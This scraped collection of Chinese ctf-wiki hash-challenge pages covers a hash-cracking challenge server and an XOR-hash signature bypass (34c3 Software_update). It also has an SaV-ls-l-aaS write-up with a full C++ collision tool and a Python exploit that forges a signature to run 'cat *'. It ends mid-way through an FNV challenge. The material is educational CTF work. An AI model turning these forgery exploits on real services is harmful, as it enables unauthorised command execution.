right?\n\nPlease wait while we generate your hash...\n    \"\"\"\n\n    hashes = [md5, sha, blake, scrypt]\n    timeout = 10\n    total_rounds = 32\n\n    def handle(self):\n        self.request.sendall(self.welcome_message.format(self.timeout).encode())\n\n        password = self.generate_password()     # from rock_you.txt\n        salt = self.generate_salt(password)     # 与password的长度有关\n        hash_rounds = self.generate_rounds()    # 生成进行hash算法的顺序\n        password_hash = self.calculate_hash(salt + password, hash_rounds)\n        self.generate_delay()\n\n        self.request.sendall(\"Challenge password hash: {}\\n\".format(b64encode(password_hash)).encode())\n        self.request.sendall(\"Rounds used:\\n\".encode())\n        test_rounds = []\n        for r in hash_rounds:\n            test_rounds.append(r)\n\n        for r in hash_rounds:\n            self.request.sendall(\"- {}\\n\".format(r.__name__).encode())\n        self.request.sendall(\"Your time starts now!\\n\".encode())\n        self.request.settimeout(self.timeout)\n        try:\n            response = self.request.recv(1024)\n            if response.strip() == password:\n                self.request.sendall(\"Congratulations! You are a true cracking master!\\n\".encode())\n                self.request.sendall(\"Welcome to the club: {}\\n\".format(flag).encode())\n                return\n        except socket.timeout:\n            pass\n        self.request.sendall(\"Your cracking skills are bad, and you should feel bad!\".encode())\n\n\n    def generate_password(self):\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n        lines = 14344391 # size of rockyou\n        line = rand % lines\n        password = \"\"\n        f = open('rockyou.txt', 'rb')\n        for i in range(line):\n            password = f.readline()\n        return password.strip()\n\n    def generate_salt(self, p):\n        msize = 128 # f-you hashcat :D\n        salt_size = msize - len(p)\n        return os.urandom(salt_size)\n\n    def generate_rounds(self):\n        rand = struct.unpack(\"Q\", os.urandom(8))[0]\n        rounds = []\n        for i in range(self.total_rounds):\n            rounds.append(self.hashes[rand % len(self.hashes)])\n            rand = rand >> 2\n        return rounds\n\n    def calculate_hash(self, payload, hash_rounds):\n        interim_salt = payload[:64]\n        interim_hash = payload[64:]\n        for i in range(len(hash_rounds)):\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n            '''\n            interim_hash = xor(\n                interim_hash,\n                hash_rounds[i](\n                    xor(interim_salt, hash_rounds[-1-i](interim_hash))\n                )\n            )\n            '''\n        final_hash = interim_salt + interim_hash\n        return final_hash\n\n    def generate_delay(self):\n        rand = struct.unpack(\"I\", os.urandom(4))[0]\n        time.sleep(rand / 1000000000.0)\n\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    allow_reuse_address = True\n\nPORT = 1337\nHOST = '0.0.0.0'\nflag = \"\"\n\nwith open(\"flag.txt\") as f:\n    flag = f.read()\n\ndef main():\n    server = ThreadedTCPServer((HOST, PORT), HashHandler)\n    server_thread = threading.Thread(target=server.serve_forever)\n    server_thread.start()\n    server_thread.join()\n\nif __name__ == \"__main__\":\n    main()\n\n\n```\n", "timestamp": "2025-10-21T22:02:54.198788"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/hash/complex.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/hash/complex.md", "content": "# 综合题目\n\n## 2017 34c3 Software_update\n\n可以看出，程序的大概意思是上传一个 zip 压缩包，然后对 signed_data 目录下的文件进行签名验证。其中，最后验证的手法是大概是将每一个文件进行 sha256 哈希，然后**异或**起来作为输入传递给 rsa 进行签名。如果通过验证的话，就会执行对应的 pre-copy.py 和 post-copy.py 文件。\n\n很自然的想法是我们修改 pre-copy.py 或者 post-copy.py 文件，使其可以读取 flag，然后再次绕过签名即可。主要有两种思路\n\n1. 根据给定的公钥文件获取对应的私钥，进而再修改文件后伪造签名，然后大概看了看公钥文件几乎不可破，所以这一点，基本上可以放弃。\n2. 修改对应文件后，利用**异或的特性使得其哈希值仍然与原来相同**，从而绕过签名检测。即使得 signed_data 目录下包含多个文件，使得这些文件的哈希值最后异或起来可以抵消修改 pre-copy.py 或者 post-copy.py文件所造成的哈希值的不同。\n\n这里，我们选择第二种方法，这里我们选择修改 pre-copy.py 文件，具体思路如下\n\n1. 计算 pre-copy.py 的原 hash 值。\n2. 修改 pre-copy.py 文件，使其可以读取 flag。与此同时，计算新的 hash 值。将两者异或，求得异或差值 delta。\n3. 寻找一系列的文件，使其 hash 值异或起来正好为 delta。\n\n关键的步骤在于第三步，而其实这个文件可以看做是一个线性组合的问题，即寻找若干个 256 维01向量使其异或值为 delta。而 \n$$\n(F=\\{0,1\\},F^{256},\\oplus ,\\cdot)\n$$\n是一个 256 维的向量空间。如果我们可以求得该向量空间的一个基，那么我们就可以求得该空间中任意指定值的所需要的向量。\n\n我们可以使用 sage 来辅助我们求，如下\n\n```python\n# generage the base of <{0,1},F^256,xor,*>\ndef gen_gf2_256_base():\n    v = VectorSpace(GF(2), 256)\n    tmphash = compute_file_hash(\"0.py\", \"\")\n    tmphash_bin = hash2bin(tmphash)\n    base = [tmphash_bin]\n    filelist = ['0.py']\n    print base\n    s = v.subspace(base)\n    dim = s.dimension()\n    cnt = 1\n    while dim != 256:\n        tmpfile = str(cnt) + \".py\"\n        tmphash = compute_file_hash(tmpfile, \"\")\n        tmphash_bin = hash2bin(tmphash)\n        old_dim = dim\n        s = v.subspace(base + [tmphash_bin])\n        dim = s.dimension()\n        if dim > old_dim:\n            base += [tmphash_bin]\n            filelist.append(tmpfile)\n            print(\"dimension \" + str(s.dimension()))\n        cnt += 1\n        print(cnt)\n    m = matrix(GF(2), 256, 256, base)\n    m = m.transpose()\n    return m, filelist\n```\n\n关于更加详细的解答，请参考 `exp.py`。\n\n这里我修改 pre-copy 多输出  `!!!!come here!!!!` 字眼，如下\n\n```shell\n➜  software_update git:(master) python3 installer.py now.zip\nPreparing to copy data...\n!!!!come here!!!!\nSoftware update installed successfully.\n```\n\n参考文献\n\n- https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme\n- https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py\n\n## 2019 36c3 SaV-ls-l-aaS\n\n这个题的分类是 Crypto&Web，捋一下流程：\n\n60601端口开着一个Web服务，题目描述给了连接方法：\n\n```bash\nurl='http://78.47.240.226:60601' && ip=$(curl -s \"$url/ip\") && sig=$(curl -s -d \"cmd=ls -l&ip=$ip\" \"$url/sign\") && curl --data-urlencode \"signature=$sig\" \"$url/exec\"\n```\n\n可以看到，先是访问 `/ip` 得到 ip，再向 `/sign` post 过去 ip 和我们要执行的命令，得到签名，最后向 `/exec` post signature 来执行命令。我们执行这一行可以发现回显了`ls -l`执行的结果，发现有个 flag.txt。\n\n看源码，Web 服务是由 go 起的：\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"crypto/sha1\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net\"\n\t\"net/http\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc main() {\n\tm := http.NewServeMux()\n\n\tm.HandleFunc(\"/ip\", func(w http.ResponseWriter, r *http.Request) {\n\t\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tfmt.Fprint(w, ip)\n\t})\n\n\tm.HandleFunc(\"/sign\", func(w http.ResponseWriter, r *http.Request) {\n\t\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tremoteAddr := net.ParseIP(ip)\n\t\tif remoteAddr == nil {\n\t\t\treturn\n\t\t}\n\n\t\tip = r.PostFormValue(\"ip\")\n\t\tsignIP := net.ParseIP(ip)\n\t\tif signIP == nil || !signIP.Equal(remoteAddr) {\n\t\t\tfmt.Fprintln(w, \"lol, not ip :>\")\n\t\t\treturn\n\t\t}\n\n\t\tcmd := r.PostFormValue(\"cmd\")\n\t\tif cmd != \"ls -l\" {\n\t\t\tfmt.Fprintln(w, \"lol, nope :>\")\n\t\t\treturn\n\t\t}\n\n\t\tmsg := ip + \"|\" + cmd\n\t\tdigest := sha1.Sum([]byte(msg))\n\n\t\tb := new(bytes.Buffer)\n\t\terr = json.NewEncoder(b).Encode(string(digest[:]))\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\n\t\tresp, err := http.Post(\"http://127.0.0.1/index.php?action=sign\", \"application/json; charset=utf-8\", b)\n\t\tif err != nil || resp.StatusCode != 200 {\n\t\t\tfmt.Fprintln(w, \"oops, hsm is down\")\n\t\t\treturn\n\t\t}\n\n\t\tbody, err := ioutil.ReadAll(resp.Body)\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(w, \"oops, hsm is bodyless?\")\n\t\t\treturn\n\t\t}\n\n\t\tvar signature string\n\t\terr = json.Unmarshal(body, &signature)\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(w, \"oops, hsm is jsonless?\")\n\t\t\treturn\n\t\t}\n\n\t\tfmt.Fprint(w, signature+msg)\n\t})\n\n\tm.HandleFunc(\"/exec\", func(w http.ResponseWriter, r *http.Request) {\n\t\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t\tremoteAddr := net.ParseIP(ip)\n\t\tif remoteAddr == nil {\n\t\t\treturn\n\t\t}\n\n\t\tsignature := r.PostFormValue(\"signature\")\n\t\tdigest := sha1.Sum([]byte(signature[172:]))\n\n\t\tb := new(bytes.Buffer)\n\t\terr = json.NewEncoder(b).Encode(signature[:172] + string(digest[:]))\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(w, \"oops, json encode\")\n\t\t\treturn\n\t\t}\n\n\t\tresp, err := http.Post(\"http://127.0.0.1/index.php?action=verify\", \"application/json; charset=utf-8\", b)\n\t\tif err != nil || resp.StatusCode != 200 {\n\t\t\tfmt.Fprintln(w, \"oops, hsm is down?\")\n\t\t\treturn\n\t\t}\n\n\t\tbody, err := ioutil.ReadAll(resp.Body)\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(w, \"oops, hsm is bodyless?\")\n\t\t\treturn\n\t\t}\n\n\t\tvar valid bool\n\t\terr = json.Unmarshal(body, &valid)\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(w, \"oops, json unmarshal\")\n\t\t\treturn\n\t\t}\n\n\t\tif valid {\n\t\t\tt := strings.Split(signature[172:], \"|\")\n\t\t\tif len(t) != 2 {\n\t\t\t\tfmt.Fprintln(w, \"oops, split\")\n\t\t\t}\n\n\t\t\tsignIP := net.ParseIP(t[0])\n\t\t\tif signIP == nil || !signIP.Equal(remoteAddr) {\n\t\t\t\tfmt.Fprintln(w, \"lol, not ip :>\")\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tconn, err := net.DialTimeout(\"tcp\", \"127.0.0.1:1024\", 1*time.Second)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Fprintln(w, \"oops, dial\")\n\t\t\t\treturn\n\t\t\t}\n\t\t\tfmt.Fprintf(conn, t[1]+\"\\n\")\n\t\t\tconn.(*net.TCPConn).CloseWrite()\n\t\t\tio.Copy(w, conn)\n\t\t}\n\t})\n\n\ts := &http.Server{\n\t\tAddr:           \":60601\",\n\t\tHandler:        m,\n\t\tReadTimeout:    5 * time.Second,\n\t\tWriteTimeout:   5 * time.Second,\n\t\tMaxHeaderBytes: 1 << 20,\n\t}\n\tlog.Fatal(s.ListenAndServe())\n}\n\n```\n\n代码很容易看，限制了 cmd 只能是`ls -l`，其余不给签名，看样子我们是要伪造其他命令的签名来读flag，这里注意到签名和验签的过程是传给本地起的一个 php 来完成的，看一下这部分源码：\n\n```php\n<?php\ndefine('ALGO', 'md5WithRSAEncryption');\n$d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR);\n\nif ($_GET['action'] === 'sign'){\n    $pkeyid = openssl_pkey_get_private(\"file:///var/www/private_key.pem\");\n    openssl_sign($d, $signature, $pkeyid, ALGO);\n\techo json_encode(base64_encode($signature));\n    openssl_free_key($pkeyid);\n}\nelseif ($_GET['action'] === 'verify') {\n    $pkeyid = openssl_pkey_get_public(\"file:///var/www/public_key.pem\");\n    echo json_encode(openssl_verify(substr($d, 172), base64_decode(substr($d,0, 172)), $pkeyid, ALGO) === 1);\n    openssl_free_key($pkeyid);\n}\n\n```\n\n采用的是`md5WithRSAEncryption`的方式签名，本地试了一下，是把我们传入的 `$d` md5 后转为hex，填充到`0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410`后面，组成数字然后用RSA签名。\n\n看样子整个逻辑找不到一点问题，用的都是标准库，基本无法攻击。有个思路是通过代理更换 ip，可以拿到两个 ip|ls -l 的签名，这样我们就拥有了两组 RSA 的 m 和 c，因为题目给了 dockerfile 给了生成公私钥的方法，使用 openssl 默认生成，e为65537，那么我们可以通过求公因数的方式来求出 n。\n\n在得到两组签名后，我们要得到 RSA 的m，就是填充后的数，所以按照代码逻辑，在 go 里面先是 sha1:\n\n```go\nmsg := ip + \"|\" + cmd\ndigest := sha1.Sum([]byte(msg))\n\nb := new(bytes.Buffer)\nerr = json.NewEncoder(b).Encode(string(digest[:]))\n```\n\n再 php 里的 md5，得到两组 m 和 c，但是总是求不出公因数 n，怀疑求的 m 不对。看代码发现 go 里把 sha1的结果用 json 编码，然后传到 php里 json 解码。这部分非常可疑，为何要用 json 编码（用 hex 传过去它不香么），本地搭一下环境跟一下。（题目给了dockerfile）\n\n起个docker，改一下 index.php，加一个`var_dump($d);`，再改一下 go，返回一下 php 的结果：\n\n```go\nfmt.Fprintln(w,string(body))\n```\n\n现在让程序签名，返回结果：\n\n```\nstring(38) \"\u000e\t\u001d�\u0012�.���?-�KC�\u0005�@�\"\n\"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\"\noops, hsm is jsonless?\n```\n\n$d 竟然是长度为 38 的字符串，看来果然是这里编码有问题，我们需要看一下每个步骤的结果，先看一下 go 里 json编码后的 sha1 结果是什么：\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"crypto/sha1\"\n\t\"encoding/json\"\n\t\"fmt\"\n)\nfunc main() {\n\tmsg := \"172.17.0.1|ls -l\"\n\tdigest := sha1.Sum([]byte(msg))\n\n\tb := new(bytes.Buffer)\n\tjson.NewEncoder(b).Encode(string(digest[:]))\n\tfmt.Print(string(b.Bytes()));\n}\n```\n\n运行一下：\n\n```\n\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n```\n\n和正常的sha1的结果来比较一下：\n\n```bash\nPython 2.7.16 (default, Sep  2 2019, 11:59:44)\n[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n'\\\\u000e\\t\\\\u001d\\\\ufffd\\\\u0012\\\\ufffd.\\\\ufffd\\\\ufffd\\\\ufffd?-\\\\ufffdKC\\\\ufffd\\\\u0005\\\\ufffd@\\\\ufffd'\n>>> from hashlib import *\n>>> sha1('172.17.0.1|ls -l').digest()\n'\\x0e\\t\\x1d\\xbd\\x12\\x90.\\xca\\xf0\\xd9?-\\x98KC\\xeb\\x05\\xa1@\\xd1'\n```\n\n由于 go 的 json 编码，很多不可见字符都被转为了 `U+fffd`，丢失了很多信息。\n\n再经过 php 接口的接收，我们来看一下结果：\n\n```php\n$d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR);\nvar_dump(file_get_contents('php://input'));\nvar_dump($d);\nvar_dump(bin2hex($d));\n```\n\n结果：\n\n```\nstring(89) \"\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\"\n\"\nstring(38) \"\u000e\t\u001d�\u0012�.���?-�KC�\u0005�@�\"\nstring(76) \"0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd\"\n\"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\"\noops, hsm is jsonless?\n\n```\n\n`U+fffd`变成了`\\xef\\xbf\\xbd`。所以由于 go 的 json 编码问题，丢失了很多信息，造成了 md5 前的数据有很多相同字符。当时做题时往下并没有细想，得到 n 后总是想构造出任意命令的签名，也很疑惑如果构造出岂不是这种签名就不安全了？其实是无法得到的。\n\n正解是 go 的这种问题 ，为碰撞创造了条件。我们可以碰撞出在这种编码情况下与 `ls -l `有相同结果的`cat *` 此类命令。但是问题是我们需要非常大量 ip 来提供碰撞的数据。\n\n可以发现，go 取 ip 的时候，是先用`net.ParseIP`解析了 ip，我们在 ip 每个数字前面加 0 ，解析后还是原来的 ip 结果，每个数字最多添加 256 个 0，四个数字就已经产生了 `2^32`种不同的组合，足以碰撞出 `ls -l `与 `cat *`之间的冲突。\n\n官方题解的 c++ 碰撞脚本我本地编译的有点问题，加了一些引入的头文件：\n\n```c++\n// g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt\n\n#include <cassert>\n#include <iomanip>\n#include <string>\n#include <sstream>\n#include <iostream>\n#include <functional>\n#include <random>\n#include <unordered_map>\n#include <algorithm>\n#include <thread>\n#include <atomic>\n#include <mutex>\n#include <array>\n#include <openssl/sha.h>\n\nconst unsigned num_threads = std::thread::hardware_concurrency();\n\n\n\nstatic std::string hash(std::string const& s)\n{\n    SHA_CTX ctx;\n    if (!SHA1_Init(&ctx)) throw;\n    if (!SHA1_Update(&ctx, s.data(), s.length())) throw;\n    std::string d(SHA_DIGEST_LENGTH, 0);\n    if (!SHA1_Final((uint8_t *) &d[0], &ctx)) throw;\n    return d;\n}\n\nstatic std::u32string kapot(std::string const& s)\n{\n    std::u32string r(s.size(), 0);\n    size_t o = 0;\n\n    for (size_t i = 0; i < s.length(); ) {\n\n        auto T = [](uint8_t c) {\n            return (c < 0x80)         ? 1   /* ASCII */\n                 : (c & 0xc0) == 0x80 ? 0   /* continuation */\n                 : (c & 0xe0) == 0xc0 ? 2   /* 2-byte chunk */\n                 : (c & 0xf0) == 0xe0 ? 3   /* 3-byte chunk */\n                 : (c & 0xf8) == 0xf0 ? 4   /* 4-byte chunk */\n                 : -1;\n        };\n\n        uint32_t c = s[i++];\n        auto cont = [&]() { c = (c << 6) | (s[i++] & 0x3f); };\n\n        switch (T(c)) {\n\n        case -1:\n        case  0:\n        invalid: c = 0xfffd; /* fall through */\n\n        case  1:\n        valid:   r[o++] = c; break;\n\n        case  2:\n                 if (c &= 0x1f, i+0 >= s.size() || T(s[i+0]))\n                     goto invalid;\n                 goto one;\n\n        case  3:\n                 if (c &= 0x1f, i+1 >= s.size() || T(s[i+0]) || T(s[i+1]))\n                     goto invalid;\n                 goto two;\n\n        case  4:\n                 if (c &= 0x1f, i+2 >= s.size() || T(s[i+0]) || T(s[i+1]) || T(s[i+2]))\n                     goto invalid;\n                 cont();\n        two:     cont();\n        one:     cont();\n                 goto valid;\n\n        }\n\n    }\n\n    r.resize(o);\n\n    return r;\n}\n\nstd::atomic<uint64_t> hcount = 0, kcount = 0;\ntypedef std::unordered_map<std::u32string, std::string> tab_t;\ntab_t tab0, tab1;\nstd::mutex mtx;\n\nstd::array<uint8_t,4> ip;\nstd::string cmd0, cmd1;\n\nclass stuffer_t\n{\n    private:\n        std::array<size_t,4> cnts;\n        size_t step;\n        std::string cmd;\n    public:\n        stuffer_t(size_t t, size_t s, std::string c) : cnts{t}, step(s), cmd(c) {}\n        std::string operator()()\n        {\n            //XXX this is by far not the most efficient way of doing this, but yeah\n            if (++cnts[3] >= cnts[0]) {\n                cnts[3] = 0;\n                if (++cnts[2] >= cnts[0]) {\n                    cnts[2] = 0;\n                    if (++cnts[1] >= cnts[0]) {\n                        cnts[1] = 0;\n                        cnts[0] += step;\n                    }\n                }\n            }\n            std::stringstream o;\n            for (size_t i = 0; i < 4; ++i)\n                o << (i ? \".\" : \"\")\n                  << std::string(cnts[i], '0')\n                  << (unsigned) ip[i];\n            o << \"|\" << cmd;\n            return o.str();\n        }\n};\n\nvoid go(size_t tid)\n{\n    //XXX tid stuff is a hack, but YOLO\n\n    bool one = tid & 1;\n\n    stuffer_t next(tid >> 1, (num_threads + 1) >> 1, one ? cmd1 : cmd0);\n\n    tab_t& mytab = one ? tab1 : tab0;\n    tab_t& thtab = one ? tab0 : tab1;\n\n    uint64_t myhcount = 0, mykcount = 0;\n\n    while (1) {\n\n        std::string r = next();\n\n        {\n\n            ++myhcount;\n\n            auto h = hash(r);\n            if ((h.size()+3)/4 < (size_t) std::count_if(h.begin(), h.end(),\n                                            [](unsigned char c) { return c < 0x80; }))\n                continue;\n\n            ++mykcount;\n\n            auto k = kapot(h);\n            if (k.size() > 3 + (size_t) std::count(k.begin(), k.end(), 0xfffd))\n                continue;\n\n            std::lock_guard<std::mutex> lck(mtx);\n\n            hcount += myhcount, myhcount = 0;\n            kcount += mykcount, mykcount = 0;\n\n            if (thtab.find(k) != thtab.end()) {\n\n                mytab[k] = r;\n\n                std::cerr << \"\\r\\x1b[K\"\n                          << \"\\x1b[32m\";\n                std::cout << tab0[k] << std::endl\n                          << tab1[k] << std::endl;\n                std::cerr << \"\\x1b[0m\";\n\n                std::cerr << std::hex;\n                bool first = true;\n                for (uint32_t c: k)\n                    std::cerr << (first ? first = false, \"\" : \" \") << c;\n                std::cerr << std::endl;\n\n                std::cerr << std::dec << \"hash count:  \\x1b[35m\" << hcount << \"\\x1b[0m\";\n                {\n                    std::stringstream s;\n                    s << std::fixed << std::setprecision(2) << log(hcount|1)/log(2);\n                    std::cerr << \" (2^\\x1b[35m\" << std::setw(5) << s.str() << \"\\x1b[0m\" << \")\" << std::endl;\n                }\n                std::cerr << \"kapot count: \" << \"\\x1b[35m\" << kcount << \"\\x1b[0m\";\n                {\n                    std::stringstream s;\n                    s << std::fixed << std::setprecision(2) << log(kcount|1)/log(2);\n                    std::cerr << \" (2^\\x1b[35m\" << std::setw(5) << s.str() << \"\\x1b[0m)\" << std::endl;\n                }\n                std::cerr << \"table sizes: \\x1b[35m\"\n                          << tab0.size() << \"\\x1b[0m \\x1b[35m\"\n                          << tab1.size() << \"\\x1b[0m\" << std::endl;\n\n                exit(0);\n\n            }\n\n            if (mytab.size() < (1 << 20))\n                mytab[k] = r;\n\n        }\n\n        hcount += myhcount;\n        kcount += mykcount;\n\n    }\n}\n\nvoid status()\n{\n    while (1) {\n\n        {\n            std::lock_guard<std::mutex> lck(mtx);\n\n            std::cerr << \"\\r\\x1b[K\";\n            std::cerr << \"hash count: \\x1b[35m\" << std::setw(12) << hcount << \"\\x1b[0m \";\n            {\n                std::stringstream s;\n                s << std::fixed << std::setprecision(2) << log(hcount|1)/log(2);\n                std::cerr << \"(2^\\x1b[35m\" << std::setw(5) << s.str() << \"\\x1b[0m) | \";\n            }\n            std::cerr << \"kapot count: \\x1b[35m\" << std::setw(12) << kcount << \"\\x1b[0m \";\n            {\n                std::stringstream s;\n                s << std::fixed << std::setprecision(2) << log(kcount|1)/log(2);\n                std::cerr << \"(2^\\x1b[35m\" << std::setw(5) << s.str() << \"\\x1b[0m) | \";\n            }\n            std::cerr << \"tables: \\x1b[35m\"\n                      << std::setw(9) << tab0.size() << \" \"\n                      << std::setw(9) << tab1.size() << \"\\x1b[0m \"\n                      << std::flush;\n        }\n\n        std::this_thread::sleep_for(std::chrono::milliseconds(100));\n    }\n}\n\nint main(int argc, char **argv)\n{\n\n    if (argc < 2) {\n        std::cerr << \"\\x1b[31mneed IPv4 in argv[1]\\x1b[0m\" << std::endl;\n        exit(1);\n    }\n    {\n        std::stringstream ss(argv[1]);\n        for (auto& v: ip) {\n            std::string s;\n            std::getline(ss, s, '.');\n            int n = std::atoi(s.c_str());\n            if (n < std::numeric_limits<uint8_t>::min() || n > std::numeric_limits<uint8_t>::max())\n                goto bad_ip;\n            v = n;\n        }\n        if (!ss) {\nbad_ip:\n            std::cerr << \"\\x1b[31mbad IPv4 given?\\x1b[0m\" << std::endl;\n            exit(2);\n        }\n    }\n\n\n    if (argc < 4) {\n        std::cerr << \"\\x1b[31mneed commands in argv[2] and argv[3]\\x1b[0m\" << std::endl;\n        exit(2);\n    }\n    cmd0 = argv[2];\n    cmd1 = argv[3];\n\n\n    std::thread status_thread(status);\n    std::vector<std::thread> ts;\n    for (unsigned i = 0; i < num_threads; ++i)\n        ts.push_back(std::thread(go, i));\n    for (auto& t: ts)\n        t.join();\n\n}\n\n\n```\n\n编译可能会找不到 `lcrypto`，编译命令加上 lcrypto 路径（我本地是 /usr/local/opt/openssl/lib）\n\n```bash\ng++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/local/opt/openssl/lib\n```\n\n与 go 交互的脚本：\n\n```python\n#!/usr/bin/env python3\nimport sys, requests, subprocess\n\nbenign_cmd = 'ls -l'\nexploit_cmd = 'cat *'\n\nip, port = sys.argv[1], sys.argv[2]\nurl = 'http://{}:{}'.format(ip, port)\n\nmy_ip = requests.get(url + '/ip').text\nprint('[+] IP: ' + my_ip)\n\no = subprocess.check_output(['./gewalt', my_ip, benign_cmd, exploit_cmd])\nprint('[+] gewalt:' + o.decode())\n\npayload = {}\nfor l in o.decode().splitlines():\n    ip, cmd = l.split('|')\n    payload['benign' if cmd == benign_cmd else 'pwn'] = ip, cmd\n\nprint(payload)\n\nsig  = requests.post(url + '/sign', data={'ip': payload['benign'][0], 'cmd': payload['benign'][1]}).text\nprint('[+] sig: ' + sig)\n\nr = requests.post(url + '/exec', data={'signature': sig[:172] + payload['pwn'][0]  + '|' + payload['pwn'][1]})\nprint(r.text)\n```\n\n```bash\n ⚙  SaV-ls-l-aaS  python solve.py 127.0.0.1 60601\n[+] IP: 172.17.0.1\nfffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd\nhash count:  168104875 (2^27.32)\nkapot count: 3477222 (2^21.73)\ntable sizes: 8745 8856\n[+] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l\n00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001|cat *\n\n{'pwn': (u'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001', u'cat *'), 'benign': (u'00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001', u'ls -l')}\n[+] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001|ls -l\nhxp{FLAG}\n```\n\n参考：\n\n- https://ctftime.org/writeup/17966\n\n\n\n", "timestamp": "2025-10-21T22:02:54.317273"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/hash/fnv.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/hash/fnv.md", "content": "# Fowler–Noll–Vo hash function\n\n具体请参见 https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function。\n\n## 2018 网鼎杯 hashcoll\n\n其实这道题是从 NSU Crypto 抄过来的，https://nsucrypto.nsu.ru/archive/2017/problems_solution，具体的 wp 之前 hellman 也写了，https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9。\n\n简单看一下题目\n\n```python\nh0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399\n\n# 2**168 + 355\ng = 374144419156711147060143317175368453031918731002211L\n\n\ndef shitty_hash(msg):\n    h = h0\n    msg = map(ord, msg)\n    for i in msg:\n        h = (h + i) * g\n        # This line is just to screw you up :))\n        h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n\n    return h - 